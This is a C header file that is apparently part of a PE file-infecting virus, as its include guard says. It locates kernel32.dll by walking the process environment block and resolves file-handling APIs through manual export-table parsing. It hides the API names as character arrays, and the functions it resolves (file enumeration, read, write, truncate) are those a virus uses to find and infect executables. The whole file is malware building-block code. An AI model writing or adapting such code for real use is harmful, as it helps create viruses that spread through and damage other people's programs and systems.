#ifndef _PE_VIRUS_FUNC_H_
#define _PE_VIRUS_FUNC_H_
#include "typedef.h"

static inline int _strcmp(const char *s1, const char *s2) {
    while(*s1 || *s2) {
        if(*s1 != *s2) return *s1 < *s2 ? -1 : 1;
        s1++, s2++;
    }
    return 0;
}

static inline DWORD FindFunction(
        PCHAR pcFuncName,
        DWORD DemandModuleBase
    ) {
    // Find address of EXPORT Directory Table
    PIMAGE_DOS_HEADER pDosHdr =  DemandModuleBase;
    PIMAGE_FILE_HEADER pFileHdr = DemandModuleBase
        + pDosHdr->e_lfanew + 0x4; /* 0x4 for signature */
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = (BYTE *)pFileHdr + sizeof(IMAGE_FILE_HEADER);
#ifdef DEBUG
    puts("File Header:");
    for (int j = 0; j < sizeof(IMAGE_FILE_HEADER); j++)
        printf("%02x, ", *((BYTE *)pFileHdr + j));
    printf("\n");

    puts("Optional Header:");
    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *((BYTE *)pOptHdr + i * 16 + j));
        printf("\n");
    }
#endif

    PIMAGE_EXPORT_DIRECTORY d = DemandModuleBase
        + pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
#ifdef DEBUG
    printf("ExportTable at: %p, name: %s\n", d, DemandModuleBase + d->Name);
    for (int i = 0; i < 5; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *((BYTE *)d + i * 16 + j));
        printf("\n");
    }
#endif
    PIMAGE_EXPORT_ADDRESS_TABLE pAddr = DemandModuleBase + d->AddressOfFunctions;
    PIMAGE_EXPORT_NAME_POINTER ppName = DemandModuleBase + d->AddressOfNames;
    PIMAGE_EXPORT_ORDINAL_TABLE pOrd = DemandModuleBase + d->AddressOfNameOrdinals;
    for (SIZE_T i = 0; i < d->NumberOfNames; i++) {
        // TODO: Use binary search here,
        // export table is ordered according to doc.
        if (_strcmp(DemandModuleBase + ppName[i], pcFuncName) == 0) {
            // Matched
            WORD ord = pOrd[i];
            DWORD FuncVA = DemandModuleBase + (pAddr + ord)->dwExportRVA;
#ifdef DEBUG
            printf("Found %s at %#x\n", pcFuncName, FuncVA);
#endif
            return FuncVA;
        }
    }
    return 0;
}

static inline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
    // Find ImageBase of kernel32.dll
    size_t DemandModuleNameLen = sizeof(DemandModuleName) / sizeof(WCHAR);  
    DWORD DemandModuleBase = 0;
    PPEB_LDR_DATA pLdr = peb->Ldr;
    LIST_ENTRY LdrDataListHead = pLdr->InMemoryOrderModuleList;
    for (PRLIST_ENTRY e = LdrDataListHead.Flink; 1 ; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY Module = CONTAINING_RECORD(
            e,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        
        // Compare name with DemandModuleName
        PWCHAR s = ((UNICODE_STRING *)Module->Reserved4)->Buffer; /* BaseDllName*/
#ifdef DEBUG
        wprintf(L"%lls\n", s);
#endif // DEBUG
        for (int k = 0; k < DemandModuleNameLen; k++) {
            if (s[k] != DemandModuleName[k])
                break;
            if (k == DemandModuleNameLen - 1) {
                // found module
                DemandModuleBase = (DWORD)Module->DllBase;
#ifdef DEBUG
                printf("Found kernel32.dll ImageBase: %#x\n", DemandModuleBase);
#endif // DEBUG
            }
        }
        if (e == LdrDataListHead.Blink) break;
    }
#ifdef DEBUG
    for (int i = 0; i < 4; i++) {
        for (int j = 0; j < 16; j++)
            printf("%02x, ", *(BYTE *)(DemandModuleBase + i * 16 + j));
        printf("\n");
    }
#endif
    return DemandModuleBase;
}

static inline void GetAllFunc(PEB *peb, SCSB *sb) {
    // Get Module Base
    WCHAR DemandModuleName[13] = {L'K', L'E', L'R', L'N', L'E', L'L',
        L'3', L'2', L'.', L'D', L'L', L'L', 0};
    DWORD DemandModuleBase = FindBase(DemandModuleName, peb);
    // Function Names
    CHAR sFindFirstFileA[15] = {'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sFindNextFileA[14] = {'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sFindClose[10] = {'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 0};
    CHAR sCreateFileA[12] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0};
    CHAR sWriteFile[10] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0};
    CHAR sReadFile[9] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0};
    CHAR sSetFilePointer[15] = {'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0};
    CHAR sSetEndOfFile[13] = {'S', 'e', 't', 'E', 'n', 'd', 'O', 'f', 'F', 'i', 'l', 'e', 0};
    CHAR sGetFileSize[12] = {'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0};
    CHAR sCloseHandle[12] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    // Get Functions
    sb->_FindFirstFileA = (__FindFirstFileA)FindFunction(sFindFirstFileA, DemandModuleBase);
    sb->_FindNextFileA = (__FindNextFileA)FindFunction(sFindNextFileA, DemandModuleBase);
    sb->_FindClose = (__FindClose)FindFunction(sFindClose, DemandModuleBase);
    sb->_CreateFileA = (__CreateFileA)FindFunction(sCreateFileA, DemandModuleBase);
    sb->_WriteFile = (__WriteFile)FindFunction(sWriteFile, DemandModuleBase);
    sb->_ReadFile = (__ReadFile)FindFunction(sReadFile, DemandModuleBase);
    sb->_SetFilePointer = (__SetFilePointer)FindFunction(sSetFilePointer, DemandModuleBase);
    sb->_SetEndOfFile = (__SetEndOfFile)FindFunction(sSetEndOfFile, DemandModuleBase);
    sb->_GetFileSize = (__GetFileSize)FindFunction(sGetFileSize, DemandModuleBase);
    sb->_CloseHandle = (__CloseHandle)FindFunction(sCloseHandle, DemandModuleBase);
}

#endif // _PE_VIRUS_FUNC_H_